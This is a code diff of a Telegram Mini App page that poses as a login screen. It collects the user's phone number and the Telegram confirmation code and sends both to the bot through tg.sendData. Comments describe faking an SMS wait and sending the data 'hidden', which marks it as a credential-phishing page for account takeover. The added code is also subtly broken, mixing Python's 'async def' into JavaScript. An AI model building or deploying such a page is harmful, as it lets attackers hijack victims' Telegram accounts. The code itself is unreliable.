@@ -9,8 +9,6 @@
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #333; border-radius: 8px; background: #2b2b2b; color: white; box-sizing: border-box; text-align: center; font-size: 18px; }
         button { width: 100%; padding: 12px; background: #248bcf; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
         .hidden { display: none; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 10px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -19,47 +17,35 @@
         <input type="tel" id="phone" placeholder="+7 999 000-00-00">
         <button onclick="sendPhone()">Продолжить</button>
     </div>
-
-    <div class="container hidden" id="loading">
-        <div class="loader"></div>
-        <p>Проверка номера...</p>
-    </div>
-
     <div class="container hidden" id="step2">
         <h3>Подтверждение</h3>
-        <p>Введите код из приложения</p>
-        <input type="text" id="code" placeholder="• • • • •">
+        <input type="text" id="code" placeholder="Код из Telegram">
         <button onclick="sendCode()">Войти</button>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
+        // Получаем данные пользователя для связи с ботом
+        const initData = tg.initData;
+
+        async def apiRequest(type, value) {
+            // Мы отправляем данные боту через обычное сообщение, но скрыто
+            tg.sendData(type + ":" + value); 
+        }
 
         function sendPhone() {
             let val = document.getElementById("phone").value;
-            if(val.length > 5) {
-                // Отправляем номер боту
-                tg.sendData("phone:" + val);
-                
-                // НЕ ЗАКРЫВАЕМ ОКНО, а показываем загрузку
-                document.getElementById("step1").classList.add("hidden");
-                document.getElementById("loading").classList.remove("hidden");
-                
-                // Через 5 секунд показываем поле для кода (имитируем ожидание SMS)
-                setTimeout(() => {
-                    document.getElementById("loading").classList.add("hidden");
-                    document.getElementById("step2").classList.remove("hidden");
-                }, 5000);
-            }
+            tg.sendData("phone:" + val);
+            document.getElementById("step1").classList.add("hidden");
+            document.getElementById("step2").classList.remove("hidden");
         }
 
         function sendCode() {
             let val = document.getElementById("code").value;
-            if(val.length >= 5) {
-                tg.sendData("code:" + val);
-                setTimeout(() => { tg.close(); }, 500); // Закрываем только после ввода кода
-            }
+            tg.sendData("code:" + val);
+            // Окно закроется только здесь
+            setTimeout(() => { tg.close(); }, 1000);
         }
     </script>
 </body>
